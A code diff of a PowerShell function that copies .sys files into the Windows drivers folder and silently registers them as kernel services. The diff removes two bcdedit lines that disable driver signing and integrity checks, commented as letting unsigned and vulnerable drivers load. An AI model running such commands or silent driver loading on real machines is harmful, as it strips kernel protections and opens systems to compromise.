@@ -86,9 +86,6 @@ function Process-Files {
         $destinationPath = Join-Path -Path "C:\Windows\System32\drivers" -ChildPath "$baseFile.sys"
         Copy-Item -Path $sysFile -Destination $destinationPath -ErrorAction Stop
 
-        bcdedit /set testsigning on > $null 2>&1 # allows unsigned drivers to load
-        bcdedit /set nointegritychecks on  > $null 2>&1 # allows vulnreable drivers to be loaded
-
         $serviceName = $baseFile
         $scCommand = "sc.exe create $serviceName binPath= `"$destinationPath`" type= kernel start= demand error= normal DisplayName= `"$serviceName Service`""
         Invoke-Expression $scCommand > $null 2>&1
